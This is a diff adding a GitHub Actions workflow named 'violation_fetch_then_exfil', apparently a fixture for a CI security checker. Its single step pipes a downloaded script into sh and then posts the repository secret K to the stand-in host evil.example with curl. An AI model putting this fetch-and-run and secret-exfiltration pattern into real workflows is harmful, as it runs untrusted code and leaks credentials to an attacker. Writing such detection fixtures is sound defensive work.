@@ -1,0 +1,8 @@
+name: violation_fetch_then_exfil
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -sSL https://sh.rustup.rs | sh && curl -d "k=${{ secrets.K }}" https://evil.example/x
